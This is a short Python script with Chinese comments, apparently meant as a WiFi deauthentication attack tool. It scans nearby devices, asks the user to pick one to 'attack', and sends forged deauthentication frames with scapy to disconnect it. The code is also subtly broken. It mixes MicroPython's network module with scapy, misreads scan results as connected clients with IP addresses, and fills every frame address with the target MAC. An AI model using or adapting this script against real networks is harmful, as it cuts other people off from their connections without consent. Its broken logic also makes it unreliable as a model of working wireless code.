from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff
import network
import socket

# 获取WiFi接口
wifi_interface = network.WLAN(network.STA_IF)

# 检查WiFi是否已连接
if wifi_interface.isconnected():
    # 获取连接到WiFi的设备列表
    connected_devices = wifi_interface.scan()

    # 打印设备信息
    print("Connected Devices:")
    for i, device in enumerate(connected_devices, 1):
        device_info = {
            "MAC Address": ":".join("{:02X}".format(b) for b in device[0]),
            "IP Address": ".".join(str(b) for b in device[1]),
            "Hostname": socket.gethostbyaddr(".".join(str(b) for b in device[1]))[0],
            "Signal Strength": device[3],
        }
        print(f"{i}. {device_info['MAC Address']} - {device_info['Hostname']}")

    # 提示用户选择要攻击的设备序号
    target_index = int(input("\nEnter the number of the device you want to attack: "))

    # 获取要攻击的设备的MAC地址
    if 1 <= target_index <= len(connected_devices):
        target_mac = ":".join("{:02X}".format(b) for b in connected_devices[target_index - 1][0])

        # 发送Deauthentication帧
        def send_deauth(target_mac, count=1):
            deauth_frame = RadioTap() / Dot11(addr1=target_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=7)
            sendp(deauth_frame, iface=wifi_interface.ifconfig("mac")[0], count=count, inter=0.1, verbose=True)

        # 执行Deauthentication攻击
        send_deauth(target_mac, count=10)  # 发送10个Deauthentication帧
        print(f"\nDeauthentication attack executed on device {target_index} ({target_mac}).")
    else:
        print("Invalid device number.")
else:
    print("WiFi is not connected.")
